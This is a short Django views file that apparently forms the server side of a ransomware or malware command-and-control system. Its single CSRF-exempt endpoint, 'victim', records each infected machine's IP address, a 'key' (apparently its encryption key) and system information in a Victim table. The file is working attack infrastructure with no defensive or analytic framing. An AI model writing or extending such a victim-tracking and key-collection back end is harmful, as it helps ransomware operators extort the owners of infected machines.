from django.http import HttpResponse, JsonResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt

from api.models import Victim


# Create your views here.

@csrf_exempt
def victim(request):
    print(request.POST)
    ip = request.POST["ip"]
    key = request.POST["key"]
    sys_information = request.POST["sys_information"]

    victim = Victim.objects.create(ip=ip, key=key, sys_information=sys_information)
    
    return JsonResponse({"id": victim.id})